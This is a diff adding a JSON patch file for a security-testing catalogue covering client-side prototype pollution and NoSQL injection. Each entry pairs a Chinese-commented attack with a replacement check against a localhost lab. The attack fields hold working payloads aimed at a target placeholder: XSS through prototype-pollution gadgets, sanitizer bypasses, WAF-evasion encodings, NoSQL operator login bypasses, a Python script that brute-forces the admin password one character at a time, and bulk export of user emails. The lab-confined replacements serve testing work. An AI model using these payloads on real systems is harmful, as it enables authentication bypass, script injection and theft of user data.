@@ -1,0 +1,75 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "proto-client-xss",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# URL参数解析污染(常见于自定义query parser)\nhttps://{TARGET}/page?__proto__[polluted]=test\nhttps://{TARGET}/page?__proto__.polluted=test\nhttps://{TARGET}/page?constructor[prototype][polluted]=test\n\n# Hash片段污染\nhttps://{TARGET}/page#__proto__[polluted]=test\n\n# 验证：在控制台检查\nconsole.log(({}).polluted); // 如果输出\"test\"则确认污染",
+          "command": "http://127.0.0.1:18080/lab/prototype-client?__proto__[labMarker]=PROTO_CLIENT_A1"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 污染jQuery的innerHTML gadget\n# Step 1: 污染原型\nhttps://{TARGET}/page?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>\n\n# Step 2: 等待jQuery调用 $(element).html() 或 $.html()\n# 当jQuery创建新元素时会读取innerHTML属性\n\n# jQuery $.extend() 深拷贝污染\n$.extend(true, {}, JSON.parse('{\"__proto__\":{\"isAdmin\":true}}'));\n// 之后所有 obj.isAdmin 都返回 true",
+          "command": "http://127.0.0.1:18080/lab/prototype-client?__proto__[innerHTML]=%3Cspan%20data-lab-marker%3D%22PROTO_DOM_B2%22%3EPROTO_DOM_B2%3C%2Fspan%3E"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 污染DOMPurify配置实现XSS\n# 绕过ALLOWED_TAGS\nhttps://{TARGET}/page?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src\n\n# 污染sanitize行为\nhttps://{TARGET}/page?__proto__[ALLOW_ARIA_ATTR]=1&__proto__[IS_ALLOWED_URI][]=javascript\n\n# Lodash template gadget\n# 如果使用 _.template 且选项被污染\nhttps://{TARGET}/page?__proto__[sourceURL]=%22%0aalert(1)//\n\n# 构造完整POC链接\nhttps://{TARGET}/page?__proto__[transport_url]=javascript:alert(1)",
+          "command": "http://127.0.0.1:18080/lab/prototype-client?__proto__[ALLOWED_ATTR][]=data-lab-marker&__proto__[labMarker]=PROTO_CONFIG_C3"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# PPScan——自动化客户端原型链污染检测\n# 使用Puppeteer自动化测试\nconst puppeteer = require('puppeteer');\nconst browser = await puppeteer.launch();\nconst page = await browser.newPage();\n\n// 注入检测脚本\nawait page.evaluateOnNewDocument(() => {\n  const marker = Math.random().toString(36);\n  Object.defineProperty(Object.prototype, '__pp_test__', {\n    set: function(v) { window.__ppDetected = true; }\n  });\n});\n\nawait page.goto('https://{TARGET}/page?__proto__[__pp_test__]=1');\nconst detected = await page.evaluate(() => window.__ppDetected);\nconsole.log('Prototype Pollution:', detected ? 'VULNERABLE' : 'NOT DETECTED');",
+          "command": "npx playwright test tests/client-prototype-boundary.spec.mjs --project=chromium --reporter=line"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# URL编码__proto__\n?__%70roto__[xss]=test\n?%5f%5fproto%5f%5f[xss]=test\n\n# 使用constructor路径\n?constructor[prototype][xss]=test\n?constructor.prototype.xss=test\n\n# 数组索引污染\n?__proto__[0]=payload\n\n# 多层嵌套\n?a[__proto__][xss]=test\n?a.b.__proto__.xss=test",
+          "command": "http://127.0.0.1:18080/lab/prototype-client?__%70roto__[labMarker]=PROTO_ENCODE_D4\nhttp://127.0.0.1:18080/lab/prototype-client?constructor[prototype][labMarker]=PROTO_CONSTRUCTOR_E5\nhttp://127.0.0.1:18080/lab/prototype-client?a[__proto__][labMarker]=PROTO_NESTED_F6"
+        }
+      ]
+    },
+    {
+      "id": "proto-nosql-injection",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 测试NoSQL操作符注入\ncurl -X POST \"https://{TARGET}/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}'\n\n# $regex匹配\ncurl -X POST \"https://{TARGET}/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\": \"admin\", \"password\": {\"$regex\": \".*\"}}'\n\n# $gt永真条件\ncurl -X POST \"https://{TARGET}/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}'",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/nosql/filter\" -H \"Content-Type: application/json\" -H \"X-Request-ID: nosql-a1\" --data '{\"username\":\"lab-user\",\"status\":{\"$ne\":\"disabled\"},\"marker\":\"NOSQL_OPERATOR_A1\"}' | jq -e '.operator_rejected == true and .matched_count == 0'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 场景：后端有操作符过滤\n# if (hasOperator(input)) reject();\n\n# 通过原型链污染注入$where\ncurl -X PATCH \"https://{TARGET}/api/settings\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__proto__\": {\"$where\": \"function(){return true}\"}}'\n\n# 后续查询将继承$where条件\ncurl -X POST \"https://{TARGET}/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\": \"admin\", \"password\": \"anything\"}'\n# 如果login查询使用了被污染的对象，$where永真条件导致认证绕过",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/nosql/filter\" -H \"Content-Type: application/json\" -H \"X-Request-ID: nosql-b2\" --data '{\"__proto__\":{\"filterMarker\":\"NOSQL_PROTO_B2\"},\"username\":\"lab-user\"}' | jq -e '.prototype_marker == null and .matched_count == 1'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 利用$regex逐字符提取管理员密码\nimport requests\nimport string\n\nurl = \"https://{TARGET}/api/login\"\npassword = \"\"\nchars = string.ascii_letters + string.digits + string.punctuation\n\nfor i in range(32):\n    for c in chars:\n        payload = {\n            \"username\": \"admin\",\n            \"password\": {\"$regex\": f\"^{password}{re.escape(c)}\"}\n        }\n        r = requests.post(url, json=payload)\n        if r.status_code == 200 and \"token\" in r.text:\n            password += c\n            print(f\"Found: {password}\")\n            break\n\nprint(f\"Admin password: {password}\")",
+          "command": "python -c \"import requests; endpoint='http://127.0.0.1:18080/lab/nosql/filter'; cases=[{'username':'lab-user'},{'username':{'$eq':'lab-user'}},{'username':{'$ne':'lab-user'}}]; [print({'case':i,'status':(r:=requests.post(endpoint,json=value,timeout=3)).status_code,'body':r.json()}) for i,value in enumerate(cases)]\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 利用$func执行服务端JS(旧版MongoDB)\ncurl -X POST \"https://{TARGET}/api/search\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"$where\": \"function(){return this.role==\\\"admin\\\"}\"}'\n\n# 利用已获取的认证绕过导出数据\ncurl -s \"https://{TARGET}/api/users?limit=1000\" \\\n  -H \"Authorization: Bearer {ADMIN_TOKEN}\" | jq '.[].email'\n\n# 检查MongoDB REST接口(如果暴露)\ncurl -s \"https://{TARGET}:28017/\" 2>/dev/null\ncurl -s \"https://{TARGET}/api/db/_stats\" 2>/dev/null",
+          "command": "rg -n --glob '*.{js,cjs,mjs,ts,tsx}' '(?:find|findOne|aggregate|updateOne|deleteOne)\\s*\\(' src server | Select-Object -First 80\nnpm ls mongodb mongoose --all"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# Unicode编码操作符\n{\"username\": \"admin\", \"password\": {\"\\u0024ne\": \"\"}}\n\n# 嵌套绕过\n{\"username\": \"admin\", \"password\": {\"$eq\": {\"$ne\": \"\"}}}\n\n# 利用Content-Type差异\n# application/x-www-form-urlencoded\nusername=admin&password[$ne]=&password[$regex]=.*\n\n# 数组注入\nusername=admin&password[0][$gt]=",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/nosql/filter\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"X-Request-ID: nosql-c3\" --data-urlencode \"username=lab-user\" --data-urlencode \"status[$ne]=disabled\" | jq -e '.operator_rejected == true and .matched_count == 0'"
+        }
+      ]
+    }
+  ]
+}
